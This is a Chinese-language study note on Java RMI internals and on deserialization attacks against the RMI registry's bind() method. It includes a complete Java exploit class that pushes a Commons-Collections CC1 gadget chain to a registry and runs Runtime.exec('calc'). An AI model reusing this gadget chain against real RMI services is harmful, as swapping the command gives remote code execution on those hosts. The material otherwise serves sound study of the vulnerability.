# RMI

## 源码分析

rmi 的源码分析实质上是在对 jdk 源码进行分析了，在我当前的阶段，我真的觉得这个过程很吃力，有太多我不明白是用来做什么的类和方法了......

从源码入手分析 RMI 为什么会产生反序列化漏洞。在实例化远程对象那一行上面打断点进行动态调试。

- 这里注意让 ida 跳过类的加载，可在settings中进行设置

**问：UnicastRemoteObject类是用来做什么的？**

**答：该类用于创建和导出远程对象**



**问：exportObject() 方法是用来做什么的？**

**答：exportObject() 方法用于导出远程对象并使其能够在特定的端口接收远程调用**



**问：UnicastServerRef 类是用来做什么的？**

**答：该类用于构造一个 Unicast 服务端的远程引用，并导出到指定的端口**

注：Unicast是计网中的一个概念，用于描述网络中一对一的通信模式。在这种通信模式中，一个发送者向一个接收者发送数据，就像是电话上的一对一通话。在 RMI 中，Unicast 是一种实现远程对象之间通信的方式。每个远程对象都有一个唯一的标识符，称为远程引用（Remote Reference）。

## RMI攻击手法

### bind() 和 readbind()

这两个方法最终会根据传入的远程对象调用 readObject() 方法，所以存在反序列化漏洞。exp 编写的核心思路也不复杂，已知最终会根据远程对象调用 readObject()，并且我们知道远程对象实际上是一个代理实例，所以可以在远程对象的调用处理器上着手。巧合的是，CC1 刚好就利用到了某个调用处理器类进行攻击，我们把 CC1 的 payload 搬过来直接用就好，不过要注意定义完代理类实例要转成 Remote 对象。

```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.HashMap;  
import java.util.Map;  
  
public class AttackRegistryEXP {  
    public static void main(String[] args) throws Exception{  

        Registry registry = LocateRegistry.getRegistry(
            "127.0.0.1",
            1099
        );  
        InvocationHandler handler = (InvocationHandler) CC1();

        Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
                Remote.class.getClassLoader(),
                new Class[] { Remote.class }, 
                handler)
            );  
        registry.bind("test",remote);  
 }  
  
    public static Object CC1() throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                    "getMethod",  
                    new Class[]{String.class, Class[].class}, 
                    new Object[]{"getRuntime", null}
                ),  
                new InvokerTransformer(
                    "invoke", 
                    new Class[]{Object.class, Object[].class}, 
                    new Object[]{null, null}
                ),  
                new InvokerTransformer(
                    "exec", 
                    new Class[]{String.class}, 
                    new Object[]{"calc"}
                )  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","drunkbaby");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(
            hashMap, 
            null, 
            chainedTransformer
        );  
        Class c = Class.forName(
            "sun.reflect.annotation.AnnotationInvocationHandler"
        );  
        Constructor aihConstructor = c.getDeclaredConstructor(
            Class.class, Map.class
        );  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
        return o;  
 }  
}
```



## 推荐阅读

1. [Java远程方法调用(RMI) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/135360489)

虽然啰嗦了一些，但是是对于官方rmi描述的汉化翻译，还是值得一看的。

2. [Java的RMI介绍及使用方法详解 | w3cschool笔记](https://www.w3cschool.cn/article/30445887.html)

这篇我看完了，感觉也挺不错，说的很简单。

3. 最后是 RMI 漏洞成因的[源码分析](https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/)



